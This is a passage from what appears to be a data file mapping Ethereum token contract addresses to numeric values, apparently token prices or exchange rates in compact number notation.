                "0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206": .0006592464,
                "0x45804880de22913dafe09f4980848ece6ecbaf78": 1.1052303051,
                "0x5a98fcbea516cf06857215779fd812ca3bef1b32": .0010956738,
                "0xe66747a101bff2dba3697199dcce5b743b454759": .0029928865,
                "0xd533a949740bb3306d119cc777fa900ba034cd52": .0006093644,
                "0x0c356b7fd36a5357e5a017ef11887ba100c9ab76": .0009900979,
                "0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c": .0002925589,
                "0x0d8775f648430679a709e98d2b0cb6250d2887ef": .0001912067,
                "0x956f47f50a910163d8bf957cf5846d573e7f87ca": .0006553048,
                "0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b": .0037909049,
                "0x111111111117dc0aa78b770fa6a738034120c302": .0003995804,
                "0xc00e94cb662c3520282e6f5717214004a7f26888": .0339414223,
                "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": .0001793559,
                "0xc18360217d8f7ab5e7c516566761ea12ce7f9d72": .0115650335,
                "0x6c6ee5e31d828de241282b9606c8e98ea48526e2": 13124e-10,
                "0x056fd409e1d7a124bd7017459dfea2f387b6d5cd": .0006664213,
                "0x6810e776880c02933d47db1b9fc05908e5386b96": .0834940332,
                "0x26b80fbfc01b71495f477d5237071242e0d959d7": 412329e-10,
                "0xba100000625a3754423978a60c9317c58a424e3d": .0045297434,
                "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": 5.3761226982,
                "0x8290333cef9e6d528dd5618fb97a76f268f3edd4": 192555e-10,
                "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429": .0001794566,
                "0x320623b8e4ff03373931769a31fc52a4e78b5d70": 40581e-10,
                "0x15d4c048f83bd7e37d49ea4c83a07267ec4203da": 231098e-10,
                "0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec": 173402e-9,
                "0xd26114cd6ee289accf82350c8d8487fedb8a0c07": .0011035408,
                "0x58b6a8a3302369daec383334672404ee733ab239": .0060573056,
                "0xe41d2489571d322189246dafa5ebde1f4699f498": .0001711764,
                "0xcdf7028ceab81fa0c6971208e83fa7872994bee5": 175193e-10,
                "0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d": .0006010411,
                "0x6123b0049f904d730db3c36a31167d9d4121fa6b": 247435e-9,
                "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2": .0011067163,
                "0x4691937a7508860f876c9c0a2a617e7d9e945d4b": 118936e-9,
                "0x799ebfabe77a6e34311eeee9825190b9ece32824": .001139579,
                "0xff20817765cb7f73d4bde2e66e067e58d11095c2": 32469e-10,
                "0xba9d4199fab4f26efe3551d490e3821486f135ba": .0001331188,
                "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac": .0002847689,
                "0x198d14f2ad9ce69e76ea330b374de4957c3f850a": 4e-10,
                "0x18aaa7115705e8be94bffebde57af9bfc265b998": .0001267624,
                "0x0f2d719407fdbeff09d87557abb7232601fd9f29": .0007241575,
                "0x04fa0d235c4abf4bcf4787af4cf447de572ef828": .0014597898,
                "0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3": 2e-10,
                "0xe28b3b32b6c345a34ff64674606124dd5aceca30": .0013632933,
                "0xdefa4e8a7bcba345f687a2f1456f5edd9ce97202": .0006009681,
                "0x00c83aecc790e8a4453e5dd3b0b4b3680501a7a7": 243917e-10,
                "0x3a4f40631a4f906c2bad353ed06de7a5d3fcb430": .0001959824,
                "0xf57e7e7c23978c3caec3c3548e3d615c346e79ff": .0003993021,
                "0x5ca381bbfb58f0092df149bd3d243b08b9a8386e": 354968e-10,
                "0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25": 21737e-10,
                "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": .0003383259,
                "0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38": .0003276047,
                "0x9e32b13ce7f2e80a01932b42553652e053d6ed8e": .0190881364,
                "0x41e5560054824ea6b0732e656e3ad64e20e94e45": 830121e-10,
                "0x0f51bb10119727a7e5ea3538074fb341f56b09ad": .0008921589,
                "0x408e41876cccdc0f92210600ef50372656052a38": 813963e-10,
                "0x9d65ff81a3c488d585bbfb0bfe3c7707c7917f54": .0077187945,
                "0x967da4048cd07ab37855c090aaf366e4ce1b9f48": .0001215177,
                "0x3c4b6e6e1ea3d4863700d7f76b36b7f3d3f13e3d": .0002647578,
                "0x92d6c1e31e14520e676a687f0a93788b716beff5": .0011171,
                "0x85eee30c52b0b379b046fb0f85f4f3dc3009afec": 84908e-9,
                "0x8f8221afbb33998d8584a2b05749ba73c37a938a": 729919e-10,
                "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b": .0001607771,
                "0x4f9254c83eb525f9fcf346490bbb3ed28a81c667": 100481e-10,
                "0xb056c38f6b7dc4064367403e26424cd2c60655e1": 863029e-10,
                "0xf4d2888d29d722226fafa5d9b24f9164c092421e": .0001450523,
                "0x4fe83213d56308330ec302a8bd641f1d0113a4cc": 965683e-10,
                "0x430ef9263e76dae63c84292c3409d61c598e9682": .0028295933,
                "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0": .0040719662,
                "0x0b38210ea11411557c13457d4da7dc6ea731b88a": .0011596818,
                "0x595832f8fc6bf59c85c527fec3740a1b7a361269": .0001348396,
                "0x744d70fdbe2ba4cf95131626614a1763df805b9e": 18704e-9,
                "0x2b591e99afe9f32eaa6214f7b7629768c40eeb39": 287312e-10,
                "0xae7ab96520de3a18e5e111b5eaab095312d7fe84": 1.0083478195,
                "0x853d955acef822db058eb8505911ed77f175b99e": .0006622985,
                "0x0316eb71485b0ab14103307bf65a021042c6d380": 13.5555607266,
                "0x68749665ff8d2d112fa859aa293f07a622782f38": 1.1065446048,
                "0xae788f80f2756a86aa2f410c651f2af83639b95b": .0001395287,
                "0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b": .033341885,
                "0xd33526068d116ce69f19a9ee46f0bd304f21a51f": .0164844332,
                "0xdf574c24545e5ffecb9a659c229253d4111d87e1": .0006610921,
                "0x5f98805a4e8be255a32880fdec7f6728c6568ba0": .0006936374,
                "0x839e71613f9aa06e5701cf6de63e303616b0dde3": 4.2e-9,
                "0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532": 30799e-10,
                "0xa8b919680258d369114910511cc87595aec0be6d": .0061140361,
                "0xdb25f211ab05b1c97d595516f45794528a807ad8": .0006568716,
                "0xde4ee8057785a7e8e800db58f9784845a5c2cbd6": .0020068531,
                "0x8f3470a7388c05ee4e7af3d01d8c722b0ff52374": .0319340655,
                "0x174afe7a032b5a33a3270a9f6c30746e25708532": 781352e-10,
                "0xa849eaae994fb86afa73382e9bd88c2b6b18dc71": 29645e-10,
                "0x767fe9edc9e0df98e07454847909b5e959d7ca0e": .0440790979,
                "0x8806926ab68eb5a7b909dcaf6fdbe5d93271d6e2": .0063582374,
                "0x7a58c0be72be218b41c608b7fe7c5bb630736c71": 125625e-10,
                "0xff56cc6b1e6ded347aa0b7676c85ab0b3d08b0fa": 219039e-10,
                "0x8c15ef5b4b21951d50e53e4fbda8298ffad25057": .0001527529,
                "0x607f4c5bb672230e8672085532f7e901544a7375": .0007150151,
                "0xd13c7342e1ef687c5ad21b27c2b65d772cab5c8c": .0002026952,
                "0x11eef04c884e24d9b7b4760e7476d06ddf797f36": 61388e-8,
                "0xfc82bb4ba86045af6f327323a46e80412b91b27d": .0036922135,
                "0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664": 94412e-10,
                "0xf99d58e463a2e07e5692127302c20a191861b4d6": .0032220619,
                "0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c": .0003019085,
                "0xf1ca9cb74685755965c7458528a36934df52a3ef": 153072e-9,
                "0x1776e1f26f98b1a5df9cd347953a26dd3cb46671": .0099856961,
                "0x090185f2135308bad17527004364ebcc2d37e5f6": 5.624e-7,
                "0x3597bfd533a99c9aa083587b074434e61eb0a258": 5.766e-7,
                "0x6e5a43db10b04701385a34afb670e404bc7ea597": .0002331573,
                "0x8a2279d4a90b6fe1c4b30fa660cc9f926797baa2": 995932e-10,
                "0x12bb890508c125661e03b09ec06e404bc9289040": 1.693e-7,
                "0xf17e65822b568b3903685a7c9f496cf7656cc6c2": .0002648068,
                "0x491604c0fdf08347dd1fa4ee062a822a5dd06b5d": 886019e-10,
                "0x419d0d8bdd9af5e606ae2232ed285aff190e711b": 50036e-10,
                "0xd3e4ba569045546d09cf021ecc5dfe42b1d7f6e4": .0011334148,
                "0x55296f69f40ea6d20e478533c15a6b08b654e758": 41214e-10,
                "0x1985365e9f78359a9b6ad760e32412f4a445e862": .0047475041,
                "0x467bccd9d29f223bce8043b84e8c8b282827790f": 8.263e-7,
                "0x662b67d00a13faf93254714dd601f5ed49ef2f51": 815781e-10,
                "0x1abaea1f7c830bd89acc67ec4af516284b1bc33c": .0006663723,
                "0xc64500dd7b0f1794807e67802f8abbf5f8ffb054": 581669e-10,
                "0xa117000000f279d81a1d3cc75430faa017fa5a2e": .0011802307,
                "0x5faa989af96af85384b8a938c2ede4a7378d9875": .001406942,
                "0xeb4c2781e4eba804ce9a9803c67d0893436bb27d": 13.6059581981,
                "0x5245c0249e5eeb2a0838266800471fd32adb1089": .0003388495,
                "0xaf5191b0de278c7286d6c7cc6ab6bb8a73ba2cd6": .0003447969,
                "0xb0c7a3ba49c7a6eaba6cd4a96c55a1391070ac9a": .0002710008,
                "0x8207c1ffc5b6804f6024322ccf34f29c3541ae26": 946178e-10,
                "0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f": .0001308945,
                "0xde7d85157d9714eadf595045cc12ca4a5f3e2adb": 282726e-10,
                "0xcb86c6a22cb56b6cf40cafedb06ba0df188a416e": 17267e-10,
                "0x57ab1ec28d129707052df4df418d58a2d46d5f51": .0006725357,
                "0xbf2179859fc6d5bee9bf9158632dc51678a4100e": 883261e-10,
                "0x0c7d5ae016f806603cb1782bea29ac69471cab9c": 424234e-10,
                "0xae12c5930881c53715b369cec7606b70d8eb229f": .0002080742,
                "0xbe9375c6a420d2eeb258962efb95551a5b722803": 44928e-10,
                "0xaaaaaa20d9e0e2461697782ef11675f668207961": .0005224516,
                "0xff742d05420b6aca4481f635ad8341f81a6300c2": 67688e-9,
                "0x33349b282065b0284d756f0577fb39c158f935e6": .0101052917,
                "0xf433089366899d83a9f26a773d59ec7ecf30355e": .0006703333,
                "0x1900e8b5619a3596745f715d0427fe617c729ba9": .0013287707,
                "0x4575f41308ec1483f3d399aa9a2826d74da13deb": 623132e-10,
                "0xdc9ac3c20d1ed0b540df9b1fedc10039df13f99c": 86898e-9,
                "0x2ef52ed7de8c5ce03a4ef0efbe9b7450f2d7edc9": 4.992e-7,
                "0x77fba179c79de5b7653f68b5039af940ada60ce0": .0027369856,
                "0x42476f744292107e34519f9c357927074ea3f75d": 320149e-10,
                "0x6dea81c8171d0ba574754ef6f8b412f2ed88c54d": .0004946156,
                "0xed04915c23f00a313a544955524eb7dbd823143d": 80228e-10,
                "0x656c00e1bcd96f256f224ad9112ff426ef053733": 754654e-10,
                "0x62359ed7505efc61ff1d56fef82158ccaffa23d7": 3.7805111069,
                "0x5b7533812759b45c2b44c19e320ba2cd2681b542": 332686e-10,
                "0x888888848b652b3e3a0f34c96e00eec0f3a23f72": 139565e-10,
                "0x34950ff2b487d9e5282c5ab342d08a2f712eb79f": 684159e-10,
                "0xd46ba6d942050d489dbd938a2c909a5d5039a161": .0007691776,
                "0xbe1a001fe942f96eea22ba08783140b9dcc09d28": 570635e-10,
                "0xec67005c4e498ec7f55e092bd1d35cbc47c91892": .0170486007,
                "0x580c8520deda0a441522aeae0f9f7a5f29629afa": .0004656286,
                "0xf1f955016ecbcd7321c7266bccfb96c68ea5e49b": 98424e-10,
                "0x940a2db1b7008b6c776d4faaca729d6d4a4aa551": 833901e-10,
                "0x74232704659ef37c08995e386a2e26cc27a8d7b1": .0100691892,
                "0x3f382dbd960e3a9bbceae22651e88158d2791550": .0007574569,
                "0x249e38ea4102d0cf8264d3701f1a0e39c4f2dc3b": 1.3e-9,
                "0x579cea1889991f68acc35ff5c3dd0621ff29b0c9": 30273e-10,
                "0xe53ec727dbdeb9e2d5456c3be40cff031ab40a55": 836719e-10,
                "0xdf2c7238198ad8b389666574f2d8bc411a4b7428": 33515e-10,
                "0x04abeda201850ac0124161f037efd70c74ddc74c": 114515e-10,
                "0xac51066d7bec65dc4589368da368b212745d63e8": .0010758516,
                "0xbc396689893d065f41bc2c6ecbee5e0085233447": .0003611926,
                "0x70e8de73ce538da2beed35d14187f6959a8eca96": .0004718405,
                "0x0391d2021f89dc339f60fff84546ea23e337750f": .0032741254,
                "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b": .0577430458,
                "0x1af2eaeaf2b1d9dda800861268e6bbb3995a6c3b": .0011962618,
                "0xce3f08e664693ca792cace4af1364d5e220827b2": 7.811e-7,
                "0x4184aa04215e5d716dd4c213fed519acadc68f92": .0003099282,
                "0xa1d0e215a23d7030842fc67ce582a6afa3ccab83": .7792864716,
                "0x83e6f1e41cdd28eaceb20cb649155049fac3d5aa": .0002999101,
                "0xe95a203b1a91a908f9b9ce46459d101078c2c3cb": .9927910565,
                "0xf1290473e210b2108a85237fbcd7b6eb42cc654f": 831395e-10,
                "0xe2f2a5c287993345a840db3b0845fbc70f5935a5": .0006994667,
                "0x3472a5a71965499acd81997a54bba8d852c6e53d": .0022857549,
                "0x081131434f93063751813c619ecca9c4dc7862a3": .0001364169,
                "0xcb84d72e61e383767c4dfeb2d8ff7f4fb89abc6e": .0008707057,
                "0x226bb599a12c826476e3a771454697ea52e9e220": .0003436301,
                "0xba50933c268f567bdc86e1ac131be072c6b0b71a": 225109e-10,
                "0x57b946008913b82e4df85f501cbaed910e58d26c": 7135e-9,
                "0xf411903cbc70a74d22900a5de66a2dda66507255": 2671e-9,
                "0x485d17a6f1b8780392d53d64751824253011a260": .0387715044,
                "0x1ceb5cb57c4d4e2b2433641b95dd330a33185a44": .0644199758,
                "0x2a8e1e676ec238d8a992307b495b45b3feaa5e86": .0006661216,
                "0xc98d64da73a6616c42117b582e832812e7b8d57f": 795918e-10,
                "0xd85a6ae55a7f33b0ee113c234d2ee308edeaf7fd": .0005201924,
                "0xb49fa25978abf9a248b8212ab4b87277682301c0": 95461e-9,
                "0xc4c7ea4fab34bd9fb9a5e1b1a98df76e26e6407c": .0003998871,
                "0x9aab071b4129b083b01cb5a0cb513ce7eca26fa5": .0002420588,
                "0x4dd672e77c795844fe3a464ef8ef0faae617c8fb": 91723e-10,
                "0x69af81e73a73b40adf4f3d4223cd9b1ece623074": .0009091847,
                "0x4123a133ae3c521fd134d7b13a2dec35b56c2463": .0001360122,
                "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55": .0007446913,
                "0xb705268213d593b8fd88d3fdeff93aff5cbdcfae": 385e-7,
                "0x1a3496c18d558bd9c6c8f609e1b129f67ab08163": 35694e-10,
                "0x5dc60c4d5e75d22588fa17ffeb90a63e535efce0": 253189e-10,
                "0xbbc2ae13b23d715c30720f079fcd9b4a74093505": .0016622883,
                "0xb4b9dc1c77bdbb135ea907fd5a08094d98883a35": 125234e-10,
                "0x80c62fe4487e1351b47ba49809ebd60ed085bf52": 567586e-10,
                "0x037a54aab062628c9bbae1fdb1583c195585fe41": 324239e-10,
                "0x6468e79a80c0eab0f9a2b574c8d5bc374af59414": 339864e-10,
                "0x0258f474786ddfd37abce6df6bbb1dd5dfc4434a": .0007294456,
                "0x442b153f6f61c0c99a33aa4170dcb31e1abda1d0": .0004762944,
                "0xdbdb4d16eda451d0503b854cf79d55697f90c8df": .0149316676,
                "0xa9b1eb5908cfc3cdf91f9b8b3a74108598009096": .0038151674,
                "0x3aada3e213abf8529606924d8d1c55cbdc70bf74": 15.3374393194,
                "0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0": .0100592945,
                "0x115ec79f1de567ec68b7ae7eda501b406626478e": 25401e-10,
                "0x94a7f270cd12545a277e656266aef5e27df3eb28": 158023e-10,
                "0x3e9bc21c9b189c09df3ef1b824798658d5011937": 53242e-10,
                "0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e": .0001469417,
                "0x25f8087ead173b73d6e8b84329989a8eea16cf73": .0001881994,
                "0x84ca8bc7997272c7cfb4d0cd3d55cd942b3c9419": .0002619375,
                "0x8578530205cecbe5db83f7f29ecfeec860c297c2": .0002918705,
                "0x7db5af2b9624e1b3b4bb69d6debd9ad1016a58ac": 4e-10,
                "0x865ec58b06bf6305b886793aa20a2da31d034e68": 558178e-10,
                "0xfca59cd816ab1ead66534d82bc21e7515ce441cf": .0015264772,
                "0x949d48eca67b17269629c7194f4b727d4ef9e5d6": .0004894267,
                "0x8e6cd950ad6ba651f6dd608dc70e5886b1aa6b24": 2.1e-9,
                "0xb59490ab09a0f526cc7305822ac65f2ab12f9723": .0005229247,
                "0xa8c8cfb141a3bb59fea1e2ea6b79b5ecbcd7b6ca": 332951e-10,
                "0x2001f2a0cf801ecfda622f6c28fb6e10d803d969": .0104762508,
                "0x19062190b1925b5b6689d7073fdfc8c2976ef8cb": .0003232877,
                "0x111111517e4929d3dcbdfa7cce55d30d4b6bc4d6": .0039493116,
                "0xd0929d411954c47438dc1d871dd6081f5c5e149c": 39587e-10,
                "0xe884cc2795b9c45beeac0607da9539fd571ccf85": 67986e-10,
                "0x196f4727526ea7fb1e17b2071b3d8eaa38486988": .0006648421,
                "0xc477d038d5420c6a9e0b031712f61c5120090de9": 196924e-9,
                "0x2a9bdcff37ab68b95a53435adfd8892e86084f93": .0007173883,
                "0x0000000000095413afc295d19edeb1ad7b71c952": .0004288043,
                "0x1c48f86ae57291f7686349f12601910bd8d470bb": .0006656076,
                "0x0d438f3b5175bebc262bf23753c1e53d03432bde": .0113206534,
                "0xe1bad922f84b198a08292fb600319300ae32471b": 344929e-10,
                "0x1c700f95df53fc31e83d89ac89e5dd778d4cd310": .0001377342,
                "0x410e731c2970dce3add351064acf5ce9e33fdbf0": 240151e-10,
                "0xa2120b9e674d3fc3875f415a7df52e382f141225": .0001070479,
                "0xc86d054809623432210c107af2e3f619dcfbf652": 398265e-10,
                "0xd084b83c305dafd76ae3e1b4e1f1fe2ecccb3988": 236105e-10,
                "0xf0f9d895aca5c8678f706fb8216fa22957685a13": 4.2e-9,
                "0x75858677e27c930fb622759feaffee2b754af07f": .0001637105,
                "0xc4f6e93aeddc11dc22268488465babcaf09399ac": 344557e-10,
                "0x5732046a883704404f284ce41ffadd5b007fd668": 507342e-10,
                "0xa91ac63d040deb1b7a5e4d4134ad23eb0ba07e14": .0003602801,
                "0xccc8cb5229b0ac8069c51fd58367fd1e622afd97": .0002232736,
                "0x4c19596f5aaff459fa38b0f7ed92f11ae6543784": 312464e-10,
                "0x33d0568941c0c64ff7e0fb4fba0b11bd37deed9f": 358502e-10,
                "0xa0246c9032bc3a600820415ae600c6388619a14d": .0250274213,
                "0x16eccfdbb4ee1a85a33f3a9b21175cd7ae753db4": .0018811708,
                "0x4b520c812e8430659fc9f12f6d0c39026c83588d": 290782e-10,
                "0x8bbe1a2961b41340468d0548c2cd5b7dfa9b684c": 292311e-10,
                "0x7ddc52c4de30e94be3a6a0a2b259b2850f421989": 637431e-10,
                "0x66761fa41377003622aee3c7675fc7b5c1c2fac5": 571304e-10,
                "0xb3cb8d5aeff0f4d1f432f353309f47b885e404e3": 100236e-10,
                "0x986ee2b944c42d017f52af21c4c69b84dbea35d8": 951871e-10,
                "0x27702a26126e0b3702af63ee09ac4d1a084ef628": 667272e-10,
                "0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d": 199951e-9,
                "0x07ef9e82721ac16809d24dafbe1792ce01654db4": .0005152443,
                "0xade00c28244d5ce17d72e40330b1c318cd12b7c3": .0001141799,
                "0x6ab4a7d75b0a42b6bc83e852dab9e121f9c610aa": .0005789602,
                "0x27054b13b1b798b345b591a4d22e6562d47ea75a": 923498e-10,
                "0xbba39fd2935d5769116ce38d46a71bde9cf03099": .0005932314,
                "0x8f693ca8d21b157107184d29d398a8d082b38b76": 207778e-10,
                "0x4cc19356f2d37338b9802aa8e8fc58b0373296e7": 29864e-10,
                "0xdb0f18081b505a7de20b18ac41856bcb4ba86a1a": .0054172052,
                "0xec213f83defb583af3a000b1c0ada660b1902a0f": 398331e-10,
                "0xde30da39c46104798bb5aa3fe8b9e0e1f348163f": .0011120065,
                "0xf8c3527cc04340b208c854e985240c02f7b7793f": .0001561311,
                "0xcc4304a31d09258b0029ea7fe63d032f52e44efe": .0001533661,
                "0x3593d125a4f7849a1b059e64f4517a86dd60c95d": 28724e-9,
                "0xef3a930e1ffffacd2fc13434ac81bd278b0ecc8d": .0002501258,
                "0x431ad2ff6a9c365805ebad47ee021148d6f7dbe0": 344566e-10,
                "0xb4a3b0faf0ab53df58001804dda5bfc6a3d59008": 95985e-10,
                "0x32353a6c91143bfd6c7d363b546e62a9a2489a20": 210363e-9,
                "0x2a3bff78b79a009976eea096a51a948a3dc00e34": 154469e-9,
                "0x7420b4b9a0110cdc71fb720908340c03f9bc03ec": 30752e-10,
                "0x3b484b82567a09e2588a13d54d032153f0c0aee0": 1e-10,
                "0x9b9647431632af44be02ddd22477ed94d14aacaa": .0001359451,
                "0xb7cb1c96db6b22b0d3d9536e0108d062bd488f74": .0001795231,
                "0x471ea49dd8e60e697f4cac262b5fafcc307506e4": .0015105571,
                "0x993864e43caa7f7f12953ad6feb1d1ca635b875f": .0002510593,
                "0xe50365f5d679cb98a1dd62d6f6e58e59321bcddf": 374234e-10,
                "0x973e52691176d36453868d9d86572788d27041a9": 2.839e-7,
                "0xdddddd4301a082e62e84e43f474f044423921918": .0005877368,
                "0x2565ae0385659badcada1031db704442e1b69982": 117696e-10,
                "0x6c28aef8977c9b773996d0e8376d2ee379446f2f": .0432931192,
                "0x9e976f211daea0d652912ab99b0dc21a7fd728e4": 66005e-10,
                "0x4161725d019690a3e0de50f6be67b07a86a9fae1": 39995e-10,
                "0x38e4adb44ef08f22f5b5b76a8f0c2d0dcbe7dca1": .0003375858,
                "0x9506d37f70eb4c3d79c398d326c871abbf10521d": .0001082222,
                "0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26": 199102e-10,
                "0x4b5f49487ea7b3609b1ad05459be420548789f1f": 10391e-10,
                "0xd417144312dbf50465b1c641d016962017ef6240": 522458e-10,
                "0x3d658390460295fb963f54dc0899cfb1c30776df": 74485e-10,
                "0xa1d65e8fb6e87b60feccbc582f7f97804b725521": .2687909205,
                "0x2ab6bb8408ca3199b8fa6c92d5b455f820af03c4": 229185e-10,
                "0x38c87aa89b2b8cd9b95b736e1fa7b612ea972169": 6.884e-7,
                "0xa71d0588eaf47f12b13cf8ec750430d21df04974": 0,
                "0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d": 20459e-9,
                "0xfa5047c9c78b8877af97bdcb85db743fd7313d4a": .0205017466,
                "0xfa14fa6958401314851a17d6c5360ca29f74b57b": 117857e-10,
                "0xc08512927d12348f6620a698105e1baac6ecd911": 45394e-10,
                "0x71ab77b7dbb4fa7e017bc15090b2163221420282": .0009742657,
                "0x3be7bf1a5f23bd8336787d0289b70602f1940875": 241695e-9,
                "0x817bbdbc3e8a1204f3691d14bb44992841e3db35": 34469e-10,
                "0xde16ce60804a881e9f8c4ebb3824646edecd478d": 62775e-10,
                "0x7d29a64504629172a429e64183d6673b9dacbfce": 258739e-9,
                "0x8ab7404063ec4dbcfd4598215992dc3f8ec853d7": 23674e-10,
                "0xd8912c10681d8b21fd3742244f44658dba12264e": .0063565545,
                "0x446c9033e7516d820cc9a2ce2d0b7328b579406f": 24039e-9,
                "0x6b0b3a982b4634ac68dd83a4dbf02311ce324181": 72078e-10,
                "0x362bc847a3a9637d3af6624eec853618a43ed7d2": 665857e-10,
                "0xdf801468a808a32656d2ed2d2d80b72a129739f4": .0009167082,
                "0x65ccd72c0813ce6f2703593b633202a0f3ca6a0c": 42363e-10,
                "0xeef9f339514298c6a857efcfc1a762af84438dee": .0023992515,
                "0x0abdace70d3790235af448c88547603b945604ea": 187602e-10,
                "0x15b7c0c907e4c6b9adaaaabc300c08991d6cea05": .0001861531,
                "0x8a854288a5976036a725879164ca3e91d30c6a1b": .0009736391,
                "0x15b543e986b8c34074dfc9901136d9355a537e7e": 20751e-10,
                "0x9d79d5b61de59d882ce90125b18f74af650acb93": .0040218548,
                "0xc17c30e98541188614df99239cabd40280810ca3": 172e-9,
                "0x5d285f735998f36631f678ff41fb56a10a4d0429": 23304e-10,
                "0x20e7125677311fca903a8897042b9983f22ea295": 10946e-10,
                "0xf94b5c5651c888d928439ab6514b93944eee6f48": 589689e-10,
                "0xd291e7a03283640fdc51b121ac401383a46cc623": .0008662814,
                "0x3da932456d082cba208feb0b096d49b202bf89c8": .0012373256,
                "0x00a8b738e453ffd858a7edf03bccfe20412f0eb0": 455264e-10,
                "0x92df60c51c710a1b1c20e42d85e221f3a1bfc7f2": 531827e-10,
                "0xb8366948b4a3f07bcbf14eb1739daa42a26b07c4": 8771e-9,
                "0xc770eefad204b5180df6a14ee197d99d808ee52d": 277954e-10,
                "0x3ab6ed69ef663bd986ee59205ccad8a20f98b4c2": .0002615309,
                "0xbc4171f45ef0ef66e76f979df021a34b46dcc81d": .0022610619,
                "0xba5bde662c17e2adff1075610382b9b691296350": .0001009124,
                "0x2ebd53d035150f328bd754d6dc66b99b0edb89aa": .0007096093,
                "0x3a880652f47bfaa771908c07dd8673a787daed3a": .0003886315,
                "0xdab396ccf3d84cf2d07c4454e10c8a6f5b008d2b": .0004550284,
                "0x9fa69536d1cda4a04cfb50688294de75b505a9ae": .0001414722,
                "0x666d875c600aa06ac1cf15641361dec3b00432ef": .002301559,
                "0x0de05f6447ab4d22c8827449ee4ba2d5c288379b": 29735e-10,
                "0x5b322514ff727253292637d9054301600c2c81e8": 197259e-10,
                "0x09a3ecafa817268f77be1283176b946c4ff2e608": .0001264471,
                "0x630d98424efe0ea27fb1b3ab7741907dffeaad78": 65308e-10,
                "0x74faab6986560fd1140508e4266d8a7b87274ffd": 28502e-10,
                "0x43dfc4159d86f3a37a5a4b3d4580b888ad7d4ddd": 87545e-9,
                "0xc229c69eb3bb51828d0caa3509a05a51083898dd": .0004139342,
                "0x746dda2ea243400d5a63e0700f190ab79f06489e": 307877e-10,
                "0x310c93dfc1c5e34cdf51678103f63c41762089cd": .0001959911,
                "0x2c974b2d0ba1716e644c1fc59982a89ddd2ff724": 47667e-9,
                "0x9e46a38f5daabe8683e10793b06749eef7d733d1": 61198e-10,
                "0x464ebe77c293e473b48cfe96ddcf88fcf7bfdac0": .0002430198,
                "0x89ab32156e46f46d02ade3fecbe5fc4243b9aaed": .0001616258,
                "0x10633216e7e8281e33c86f02bf8e565a635d9770": 215229e-10,
                "0x968f6f898a6df937fc1859b323ac2f14643e3fed": 586749e-10,
                "0xa393473d64d2f9f026b60b6df7859a689715d092": .0003062906,
                "0x87d73e916d7057945c9bcd8cdd94e42a6f47f776": .0142583036,
                "0x03ab458634910aad20ef5f1c8ee96f1d6ac54919": .0018736814,
                "0xe0c05ec44775e4ad62cdc2eecdf337aa7a143363": 857608e-9,
                "0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697": .0004173624,
                "0xc19b6a4ac7c7cc24459f08984bbd09664af17bd1": 12031e-8,
                "0xfb7b4564402e5500db5bb6d63ae671302777c75a": 858252e-10,
                "0x701c244b988a513c945973defa05de933b23fe1d": .0001077796,
                "0xf59ae934f6fe444afc309586cc60a84a0f89aaea": .001104587,
                "0x1fcdce58959f536621d76f5b7ffb955baa5a672f": 127104e-10,
                "0x8642a849d0dcb7a15a974794668adcfbe4794b56": .0004186757,
                "0xb98d4c97425d9908e66e53a6fdf673acca0be986": 816693e-10,
                "0x321c2fe4446c7c963dc41dd58879af648838f98d": .0022144784,
                "0x99ea4db9ee77acd40b119bd1dc4e33e1c070b80d": 111225e-10,
                "0x678e840c640f619e17848045d23072844224dd37": 2.251e-7,
                "0x61e90a50137e1f645c9ef4a0d3a4f01477738406": .0003086708,
                "0x581911b360b6eb3a14ef295a83a91dc2bce2d6f7": 33825e-10,
                "0x584bc13c7d411c00c01a62e8019472de68768430": 109773e-10,
                "0x7a939bb714fd2a48ebeb1e495aa9aaa74ba9fa68": 171729e-10,
                "0x6d2c508fc4a588a41713ff59212f85489291d244": .0001992646,
                "0x3496b523e5c00a4b4150d6721320cddb234c3079": 386301e-10,
                "0x55af5865807b196bd0197e0902746f31fbccfa58": 793088e-9,
                "0x0ae055097c6d159879521c384f1d2123d1f195e6": .0008786931,
                "0x3b9be07d622accaed78f479bc0edabfd6397e320": .0001335013,
                "0xf203ca1769ca8e9e8fe1da9d147db68b6c919817": 6157e-8,
                "0x286bda1413a2df81731d4930ce2f862a35a609fe": 734974e-10,
                "0x9355372396e3f6daf13359b7b607a3374cc638e0": .0007300077,
                "0xfad45e47083e4607302aa43c65fb3106f1cd7607": 1.81e-8,
                "0x1410434b0346f5be678d0fb554e5c7ab620f8f4a": 7.547e-7,
                "0x808507121b80c02388fad14726482e061b8da827": 388714e-10,
                "0xf3ae5d769e153ef72b4e3591ac004e89f48107a1": 57314e-10,
                "0x340d2bde5eb28c1eed91b2f790723e3b160613b7": 20228e-10,
                "0x3a8cccb969a61532d1e6005e2ce12c200caece87": .0001337182,
                "0x08d967bb0134f2d07f7cfb6e246680c53927dd30": 623333e-10,
                "0x7c84e62859d0715eb77d1b1c4154ecd6abb21bec": 39514e-10,
                "0x0763fdccf1ae541a5961815c0872a8c5bc6de4d7": 393344e-10,
                "0x23b608675a2b2fb1890d3abbd85c5775c51691d5": 22.9184963461,
